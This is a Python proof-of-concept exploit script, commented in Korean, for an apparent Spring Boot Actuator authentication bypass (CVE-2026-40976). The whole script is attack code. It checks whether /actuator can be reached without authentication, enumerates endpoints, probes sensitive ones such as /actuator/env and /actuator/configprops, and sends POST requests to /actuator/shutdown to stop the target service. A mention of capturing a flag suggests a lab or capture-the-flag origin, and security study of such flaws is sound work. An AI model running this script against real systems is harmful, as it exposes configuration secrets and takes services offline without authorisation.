#!/usr/bin/env python3
"""
CVE-2026-40976 PoC - Spring Boot Actuator Authentication Bypass
Spring Boot 4.0.0 ~ 4.0.5
"""

import subprocess
import sys
import importlib.util

# ============================================================
# requests 라이브러리 자동 설치
# ============================================================
def install_requests():
    """requests 라이브러리가 없으면 자동 설치"""
    try:
        # requests가 설치되어 있는지 확인
        import requests
        return True
    except ImportError:
        print("[*] requests 라이브러리가 없습니다. 설치를 진행합니다...")
        try:
            # pip로 설치
            subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
            print("[+] requests 라이브러리 설치 완료!")
            return True
        except subprocess.CalledProcessError:
            print("[-] requests 라이브러리 설치 실패. 수동으로 설치해주세요: pip install requests")
            return False

# requests 설치 확인
if not install_requests():
    sys.exit(1)

# 설치 후 import
import requests
import json
import sys
from urllib.parse import urljoin

# ============================================================
# 본격적인 PoC 코드
# ============================================================

# 색상 출력 (선택사항)
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    RESET = '\033[0m'

def print_banner():
    banner = """
    ╔═══════════════════════════════════════════════════╗
    ║   CVE-2026-40976 - Spring Boot Actuator Bypass   ║
    ║         Spring Boot 4.0.0 ~ 4.0.5                ║
    ╚═══════════════════════════════════════════════════╝
    """
    print(f"{Colors.BLUE}{banner}{Colors.RESET}")

def check_actuator(target_url):
    """Actuator 엔드포인트 접근 확인"""
    actuator_url = urljoin(target_url, "/actuator")

    try:
        response = requests.get(actuator_url, timeout=5, verify=False)

        if response.status_code == 200:
            print(f"{Colors.GREEN}[+] Actuator 접근 성공! (인증 우회 확인){Colors.RESET}")
            print(f"    응답: {response.text[:200]}...")
            return True
        elif response.status_code == 401:
            print(f"{Colors.RED}[-] Actuator 접근 실패: 인증 필요 (401){Colors.RESET}")
            return False
        elif response.status_code == 403:
            print(f"{Colors.RED}[-] Actuator 접근 실패: 접근 금지 (403){Colors.RESET}")
            return False
        else:
            print(f"{Colors.YELLOW}[!] Actuator 접근 응답: {response.status_code}{Colors.RESET}")
            return False

    except requests.exceptions.ConnectionError:
        print(f"{Colors.RED}[-] 연결 실패: 서버가 실행 중인지 확인하세요.{Colors.RESET}")
        return False
    except requests.exceptions.Timeout:
        print(f"{Colors.RED}[-] 연결 시간 초과{Colors.RESET}")
        return False

def enumerate_endpoints(target_url):
    """Actuator 엔드포인트 목록 확인"""
    actuator_url = urljoin(target_url, "/actuator")

    try:
        response = requests.get(actuator_url, timeout=5, verify=False)

        if response.status_code == 200:
            data = response.json()
            endpoints = data.get('_links', {})

            print(f"\n{Colors.GREEN}[+] 발견된 Actuator 엔드포인트:{Colors.RESET}")
            for name, info in endpoints.items():
                href = info.get('href', '')
                print(f"    - {Colors.YELLOW}{name}{Colors.RESET}: {href}")
            return endpoints

    except Exception as e:
        print(f"{Colors.RED}[-] 엔드포인트 목록 확인 실패: {e}{Colors.RESET}")
        return {}

def exploit_shutdown(target_url):
    """Shutdown 엔드포인트 공격"""
    endpoints = ['/actuator/shutdown', '/actuator/custom-shutdown']

    for endpoint in endpoints:
        url = urljoin(target_url, endpoint)
        try:
            response = requests.post(url, timeout=5, verify=False)

            if response.status_code == 200:
                print(f"\n{Colors.GREEN}🎉 공격 성공! 플래그 획득!{Colors.RESET}")
                print(f"{Colors.YELLOW}{'='*50}{Colors.RESET}")
                print(json.dumps(response.json(), indent=2, ensure_ascii=False))
                print(f"{Colors.YELLOW}{'='*50}{Colors.RESET}")
                return True
            elif response.status_code == 405:
                print(f"{Colors.YELLOW}[!] {endpoint} - Method Not Allowed (POST가 아닌가요?){Colors.RESET}")
            else:
                print(f"{Colors.RED}[-] {endpoint} - 응답 코드: {response.status_code}{Colors.RESET}")

        except requests.exceptions.ConnectionError:
            print(f"{Colors.RED}[-] 연결 실패: 서버가 종료되었을 수 있습니다.{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[-] 오류 발생: {e}{Colors.RESET}")

    return False

def check_sensitive_endpoints(target_url):
    """민감한 Actuator 엔드포인트 확인"""
    sensitive = [
        '/actuator/env',
        '/actuator/configprops',
        '/actuator/beans',
        '/actuator/threaddump',
        '/actuator/mappings',
        '/actuator/health'
    ]

    print(f"\n{Colors.BLUE}[*] 민감한 엔드포인트 확인 중...{Colors.RESET}")

    for endpoint in sensitive:
        url = urljoin(target_url, endpoint)
        try:
            response = requests.get(url, timeout=5, verify=False)

            if response.status_code == 200:
                print(f"{Colors.GREEN}[+] 접근 가능: {endpoint}{Colors.RESET}")
                if endpoint == '/actuator/env':
                    try:
                        data = response.json()
                        print(f"    환경 변수 수: {len(data.get('propertySources', []))}개")
                    except:
                        pass
            elif response.status_code == 404:
                print(f"{Colors.YELLOW}[-] 없음: {endpoint}{Colors.RESET}")
            else:
                print(f"{Colors.RED}[-] 차단됨 ({response.status_code}): {endpoint}{Colors.RESET}")

        except Exception as e:
            print(f"{Colors.RED}[-] 오류: {endpoint} - {e}{Colors.RESET}")

def main():
    print_banner()

    if len(sys.argv) < 2:
        print(f"{Colors.RED}사용법: python3 {sys.argv[0]} <target_url>{Colors.RESET}")
        print(f"예시: python3 {sys.argv[0]} http://localhost:8080")
        sys.exit(1)

    target_url = sys.argv[1].rstrip('/')
    print(f"{Colors.BLUE}[*] 대상 URL: {target_url}{Colors.RESET}\n")

    # Step 1: Actuator 접근 확인
    print(f"{Colors.BLUE}[1/4] Actuator 인증 우회 확인...{Colors.RESET}")
    if not check_actuator(target_url):
        print(f"{Colors.RED}[-] 취약하지 않은 것으로 보입니다.{Colors.RESET}")
        sys.exit(1)

    # Step 2: 엔드포인트 목록 확인
    print(f"\n{Colors.BLUE}[2/4] Actuator 엔드포인트 목록 확인...{Colors.RESET}")
    endpoints = enumerate_endpoints(target_url)

    # Step 3: 민감한 엔드포인트 확인
    print(f"\n{Colors.BLUE}[3/4] 민감한 엔드포인트 접근 확인...{Colors.RESET}")
    check_sensitive_endpoints(target_url)

    # Step 4: Shutdown 공격 시도
    print(f"\n{Colors.BLUE}[4/4] Shutdown 엔드포인트 공격 시도...{Colors.RESET}")
    if exploit_shutdown(target_url):
        print(f"\n{Colors.GREEN}✅ CVE-2026-40976 취약점 확인 완료!{Colors.RESET}")
    else:
        print(f"\n{Colors.YELLOW}⚠️ Shutdown 엔드포인트를 찾을 수 없습니다.{Colors.RESET}")
        print(f"   직접 엔드포인트를 확인해보세요:")

if __name__ == "__main__":
    # SSL 경고 무시 (선택사항)
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    main()